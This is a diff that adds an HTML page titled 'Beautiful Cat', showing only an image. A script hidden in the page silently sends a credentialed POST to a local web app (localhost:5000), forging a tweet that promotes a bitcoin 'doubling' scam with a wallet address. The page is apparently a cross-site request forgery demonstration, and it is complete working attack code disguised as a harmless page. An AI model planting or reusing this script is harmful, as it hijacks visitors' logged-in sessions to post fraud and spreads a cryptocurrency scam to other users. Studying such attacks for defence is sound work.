@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beautiful Cat</title>
+</head>
+<body>
+    <img src="beautiful_cat.jpg">
+
+    <!-- AHAHAHA HIDDEN SCRIPT -->
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST","http://localhost:5000",false);
+        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhr.withCredentials=true; // Send cookie related to http://localhost:5000/ with this request
+        xhr.send("tweetContent=Feeling greatful, doubling all payments sent to my BTC address! <br><br>You send $1,000, I send back $2,000! <br> Only doing this for the next 30 minutes.<br><br><br>bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh");
+    </script>
+    
+</body>
+</html>
